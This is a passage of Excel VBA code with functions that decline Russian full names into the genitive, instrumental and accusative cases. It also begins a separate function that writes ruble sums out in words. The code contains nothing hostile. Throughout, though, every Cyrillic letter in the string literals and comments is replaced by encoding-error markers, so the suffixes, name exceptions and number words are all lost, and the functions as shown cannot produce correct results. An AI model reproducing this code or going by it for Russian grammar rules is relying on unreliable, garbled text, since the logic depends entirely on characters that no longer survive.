                    Case "|fffd|", "|fffd|": GenitiveCase = GenitiveCase & sName
                    Case Else: GenitiveCase = GenitiveCase & sName & "|fffd|"
                End Select
            Else
                Select Case Right(sName, 1)
                    Case "|fffd|"
                        Select Case Right(sName, 2)
                            Case "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|"
                                GenitiveCase = GenitiveCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                            Case Else
                                GenitiveCase = GenitiveCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                        End Select
                    Case "|fffd|": GenitiveCase = GenitiveCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                    Case Else: GenitiveCase = GenitiveCase & sName
                End Select
            End If
        End If
        GenitiveCase = GenitiveCase & " "
    End If

    If Len(sPatronymic) > 0 Then        '   |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|" Or Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|" Then
            GenitiveCase = GenitiveCase & sPatronymic
        Else
            If bMaleSex Then
                GenitiveCase = GenitiveCase & sPatronymic & "|fffd|"
            Else
                GenitiveCase = GenitiveCase & Mid(sPatronymic, 1, Len(sPatronymic) - 1) & "|fffd|"
            End If
        End If
    End If
    GenitiveCase = Replace(GenitiveCase, "-", "- ")
    GenitiveCase = StrConv(GenitiveCase, vbUnicode + vbProperCase)
    GenitiveCase = Trim(Replace(GenitiveCase, "- ", "-"))
End Function

Function GetGenitiveException(ByVal txt$) As String        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Select Case txt$
        Case "|fffd||fffd||fffd||fffd||fffd|": GetGenitiveException = "|fffd||fffd||fffd||fffd||fffd|"
        Case "|fffd||fffd||fffd|": GetGenitiveException = "|fffd||fffd||fffd||fffd|"
        Case "|3f8||fffd||fffd|": GetGenitiveException = "|fffd||fffd||fffd||fffd||fffd|"
        Case "|fffd||fffd||fffd||fffd||fffd||fffd|": GetGenitiveException = "|fffd||fffd||fffd||fffd||fffd||fffd|"

            ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            ' Case "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|": GetGenitiveException = txt$
    End Select
End Function

Function InstrumentalCase(sSurname$, Optional sName$, Optional sPatronymic$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: sSurname - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, sName - |fffd||fffd||fffd|, sPatronymic - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd| 2015 EducatedFool

    Application.Volatile True        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    sSurname$ = Replace(sSurname$, " - ", "-"): sSurname$ = Replace(Replace(sSurname$, " -", "-"), "- ", "-")

    On Error Resume Next
    If sName$ = "" And sPatronymic$ = "" Then
        arr = Split(Application.Trim(sSurname$))
        sSurname$ = arr(0): sName$ = arr(1): sPatronymic$ = Replace(arr(2), ".", "")
    End If

    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|:   |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| "|fffd||fffd||fffd|" |fffd||fffd||fffd| "|fffd||fffd||fffd||fffd|" - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|.
    Dim bMaleSex As Boolean:        ' bMaleSex = (Right(sPatronymic, 1) = "|fffd|" Or Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|")
    bMaleSex = Not (Right(sPatronymic, 2) = "|fffd||fffd|" Or Right(sPatronymic, 3) = "|fffd||fffd||fffd|")

    If Len(sSurname) > 0 Then        '   |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        arrSurname = Split(sSurname, "-")
        For i = LBound(arrSurname) To UBound(arrSurname)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            sRes = "": sSurnamePart = arrSurname(i)

            If bMaleSex Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Select Case Right(sSurnamePart, 1)
                    Case "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", ChrW(1110): sRes = sSurnamePart
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd||fffd|"
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd||fffd|"
                        If UBound(arrSurname) > 0 And i = 0 Then sRes = sSurnamePart
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd||fffd|"
                        If UBound(arrSurname) > 0 And i = 0 Then sRes = sSurnamePart
                    Case "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|": sRes = sSurnamePart & "|fffd||fffd|"
                    Case "|fffd|", "|fffd|", "|fffd|": sRes = sSurnamePart & "|fffd||fffd|"
                    Case Else: sRes = sSurnamePart & "|fffd||fffd|"
                End Select

                Select Case Right(sSurnamePart, 2)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd||fffd|"
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd||fffd|"
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd||fffd|"
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                        If LCase(sSurnamePart) Like "*[|fffd|]|fffd||fffd|" Then sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                    Case "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|": sRes = sSurnamePart
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd||fffd|"
                    Case "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|": sRes = sSurnamePart & "|fffd||fffd|"
                    Case "|fffd||fffd|", "|fffd||fffd|": sRes = sSurnamePart & "|fffd||fffd|"
                End Select

            Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Select Case Right(sSurnamePart, 1)
                    Case "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", _
                         "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|": sRes = sSurnamePart
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                    Case Else: sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd||fffd|"
                End Select

                Select Case Right(sSurnamePart, 2)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    Case "|fffd||fffd|", "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd||fffd|"
                End Select

            End If

            ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| -|fffd|, -|fffd|, -|fffd|, -|fffd|, -|fffd|, -|fffd|, -|fffd|,
            ' |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| -|fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If LCase(sSurnamePart) Like "*[|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]|fffd|" Then sRes = sSurnamePart

            arrSurname(i) = sRes
        Next
        InstrumentalCase = Join(arrSurname, "-") & " "        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    End If

    If Len(sName) > 0 Then        '   |fffd||fffd||fffd|
        NameException$ = GetInstrumentalException(sName)
        If Len(NameException$) Then        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            InstrumentalCase = InstrumentalCase & NameException$
        Else        ' |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If bMaleSex Then
                Select Case Right(sName, 1)
                    Case "|fffd|", "|fffd|": InstrumentalCase = InstrumentalCase & Mid(sName, 1, Len(sName) - 1) & "|fffd||fffd|"
                    Case "|fffd|": InstrumentalCase = InstrumentalCase & Mid(sName, 1, Len(sName) - 1) & "|fffd||fffd|"
                    Case "|fffd|": InstrumentalCase = InstrumentalCase & Mid(sName, 1, Len(sName) - 1) & "|fffd||fffd|"
                    Case "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|": InstrumentalCase = InstrumentalCase & sName
                    Case Else: InstrumentalCase = InstrumentalCase & sName & "|fffd||fffd|"
                End Select
            Else
                Select Case Right(sName, 1)
                    Case "|fffd|": InstrumentalCase = InstrumentalCase & Mid(sName, 1, Len(sName) - 1) & "|fffd||fffd|"
                    Case "|fffd|": InstrumentalCase = InstrumentalCase & Mid(sName, 1, Len(sName) - 1) & "|fffd||fffd|"
                    Case "|fffd|": InstrumentalCase = InstrumentalCase & Mid(sName, 1, Len(sName) - 1) & "|fffd||fffd|"
                    Case Else: InstrumentalCase = InstrumentalCase & sName
                End Select
            End If
        End If
        InstrumentalCase = InstrumentalCase & " "
    End If

    If Len(sPatronymic) > 0 Then        '   |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If Right(sPatronymic, 3) = ChrW(1201) & "|fffd||fffd|" Or Right(sPatronymic, 4) = ChrW(1179) & "|fffd||fffd||fffd|" _
           Or Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|" Or Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|" Then
            InstrumentalCase = InstrumentalCase & sPatronymic
        Else
            If bMaleSex Then
                Select Case Right(sPatronymic, 3)
                    Case "|fffd||fffd||fffd|"
                        InstrumentalCase = InstrumentalCase & sPatronymic & "|fffd||fffd|"
                    Case Else
                        InstrumentalCase = InstrumentalCase & sPatronymic & "|fffd||fffd|"
                End Select
            Else
                InstrumentalCase = InstrumentalCase & Mid(sPatronymic, 1, Len(sPatronymic) - 1) & "|fffd||fffd|"
            End If
        End If
    End If
    InstrumentalCase = Replace(InstrumentalCase, "-", "- ")
    InstrumentalCase = StrConv(InstrumentalCase, vbUnicode + vbProperCase)
    InstrumentalCase = Replace(InstrumentalCase, "- ", "-")
End Function

Function GetInstrumentalException(ByVal txt$) As String        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Select Case txt$
        Case "|fffd||fffd||fffd||fffd||fffd|": GetInstrumentalException = "|fffd||fffd||fffd||fffd||fffd||fffd|"
        Case "|fffd||fffd||fffd|": GetInstrumentalException = "|fffd||fffd||fffd||fffd||fffd|"
        Case "|3f8||fffd||fffd|": GetInstrumentalException = "|fffd||fffd||fffd||fffd||fffd||fffd|"

            ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Case "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|": GetInstrumentalException = txt$
    End Select
End Function

Function AccusativeCase(sSurname$, Optional sName$, Optional sPatronymic$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: sSurname - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, sName - |fffd||fffd||fffd|, sPatronymic - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd| 2013 EducatedFool

    Application.Volatile True        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    sSurname$ = Replace(sSurname$, " - ", "-"): sSurname$ = Replace(Replace(sSurname$, " -", "-"), "- ", "-")

    On Error Resume Next
    If sName$ = "" And sPatronymic$ = "" Then
        arr = Split(Application.Trim(sSurname$))
        sSurname$ = arr(0): sName$ = arr(1): sPatronymic$ = Replace(arr(2), ".", "")
    End If

    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|:   |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| "|fffd||fffd||fffd|" |fffd||fffd||fffd| "|fffd||fffd||fffd||fffd|" - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|.
    Dim bMaleSex As Boolean:        ' bMaleSex = (Right(sPatronymic, 1) = "|fffd|" Or Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|")
    bMaleSex = Not (Right(sPatronymic, 2) = "|fffd||fffd|" Or Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|")

    If Len(sSurname) > 0 Then        '   |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        arrSurname = Split(sSurname, "-")
        For i = LBound(arrSurname) To UBound(arrSurname)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            sRes = "": sSurnamePart = arrSurname(i)

            If bMaleSex Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Select Case Right(sSurnamePart, 1)
                    Case "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|": sRes = sSurnamePart
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd||fffd|"
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                        If UBound(arrSurname) > 0 And i = 0 Then sRes = sSurnamePart
                    Case Else: sRes = sSurnamePart & "|fffd|"
                End Select

                Select Case Right(sSurnamePart, 2)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                        If LCase(sSurnamePart) Like "*[|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]|fffd||fffd|" Then sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd||fffd|"
                        If LCase(sSurnamePart) Like "*[!|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|][!|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]|fffd||fffd|" Then sRes = sSurnamePart & "|fffd|"
                    Case "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|": sRes = sSurnamePart
                    Case "|fffd||fffd|", "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd||fffd|"
                        If Len(sSurnamePart) <= 4 Then sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                        If Right(sSurnamePart, 3) = "|fffd||fffd||fffd|" Then sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd||fffd|"
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                End Select

            Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Select Case Right(sSurnamePart, 1)
                    Case "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", _
                         "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|": sRes = sSurnamePart
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                    Case "|fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd|"
                    Case Else: sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 1) & "|fffd|"
                End Select

                Select Case Right(sSurnamePart, 2)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                    Case "|fffd||fffd|": sRes = Mid(sSurnamePart, 1, Len(sSurnamePart) - 2) & "|fffd||fffd|"
                End Select

            End If

            ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| -|fffd|, -|fffd|, -|fffd|, -|fffd|, -|fffd|, -|fffd|, -|fffd|,
            ' |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| -|fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If LCase(sSurnamePart) Like "*[|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]|fffd|" Then sRes = sSurnamePart

            arrSurname(i) = sRes
        Next
        AccusativeCase = Join(arrSurname, "-") & " "        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    End If

    If Len(sName) > 0 Then        '   |fffd||fffd||fffd|
        NameException$ = GetAccusativeException(sName)
        If Len(NameException$) Then        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            AccusativeCase = AccusativeCase & NameException$
        Else        ' |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If bMaleSex Then
                Select Case Right(sName, 1)
                    Case "|fffd|", "|fffd|": AccusativeCase = AccusativeCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                    Case "|fffd|": AccusativeCase = AccusativeCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                    Case "|fffd|": AccusativeCase = AccusativeCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                    Case "|fffd|", "|fffd|": AccusativeCase = AccusativeCase & sName
                    Case Else: AccusativeCase = AccusativeCase & sName & "|fffd|"
                End Select
            Else
                Select Case Right(sName, 1)
                    Case "|fffd|": AccusativeCase = AccusativeCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                    Case "|fffd|": AccusativeCase = AccusativeCase & Mid(sName, 1, Len(sName) - 1) & "|fffd|"
                    Case Else: AccusativeCase = AccusativeCase & sName
                End Select
            End If
        End If
        AccusativeCase = AccusativeCase & " "
    End If

    If Len(sPatronymic) > 0 Then        '   |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|" Or Right(sPatronymic, 4) = "|fffd||fffd||fffd||fffd|" Then
            AccusativeCase = AccusativeCase & sPatronymic
        Else
            If bMaleSex Then
                AccusativeCase = AccusativeCase & sPatronymic & "|fffd|"
            Else
                AccusativeCase = AccusativeCase & Mid(sPatronymic, 1, Len(sPatronymic) - 1) & "|fffd|"
            End If
        End If
    End If
    AccusativeCase = Replace(AccusativeCase, "-", "- ")
    AccusativeCase = StrConv(AccusativeCase, vbUnicode + vbProperCase)
    AccusativeCase = Trim(Replace(AccusativeCase, "- ", "-"))
End Function

Function GetAccusativeException(ByVal txt$) As String        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Select Case txt$
        Case "|fffd||fffd||fffd||fffd||fffd|": GetAccusativeException = "|fffd||fffd||fffd||fffd||fffd|"
        Case "|fffd||fffd||fffd|": GetAccusativeException = "|fffd||fffd||fffd||fffd|"
        Case "|3f8||fffd||fffd|": GetAccusativeException = "|fffd||fffd||fffd||fffd||fffd|"
            ' Case "|fffd||fffd||fffd||fffd||fffd||fffd|": GetAccusativeException = "|fffd||fffd||fffd||fffd||fffd||fffd|"

            ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            ' Case "|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|": GetAccusativeException = txt$
    End Select
End Function


'---------------------------------------------------------------------------------------
' Module    : funcFormatCondition
' Author    : The_Prist
'---------------------------------------------------------------------------------------
Function Propis_Summ_RUS(Number, Optional Rub As Integer, Optional Kop As Integer, _
                         Optional PodpisOnly As Integer, Optional FractionPart As Integer) As String
    Application.Volatile True
    Dim sMinus As String, sRubles As String, sThousands As String, sNumber As String, sKop As String, sTis As String, sMil As String, sStr
    avOne = Array("|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd| ")
    avTeens = Array("|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
    avTens = Array("", "|fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")
